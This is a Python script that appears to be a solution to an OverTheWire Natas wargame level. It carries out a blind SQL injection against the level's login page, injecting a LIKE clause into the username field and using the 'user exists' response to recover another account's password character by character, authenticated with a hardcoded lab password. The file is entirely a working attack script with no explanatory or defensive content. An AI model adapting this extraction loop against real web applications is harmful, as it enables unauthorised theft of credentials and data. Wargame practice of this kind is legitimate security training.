import urllib.request
password = []
dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
while len(password) < 64:
    for char in dictionary:
        print(char)
        password.append(char)
        URL = f"""http://natas15.natas.labs.overthewire.org/index.php?username=natas16"%20AND%20password%20LIKE%20"{"".join(password)}%%&debug=1"""

        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        password_mgr.add_password(None, URL, "natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
        handler = urllib.request.HTTPBasicAuthHandler(password_mgr)

        opener = urllib.request.build_opener(handler)

        response = opener.open(URL)
        if "This user exists." in response.read().decode("ascii"):
            pass
        else:
            password.pop()
        print(password)

# print(password)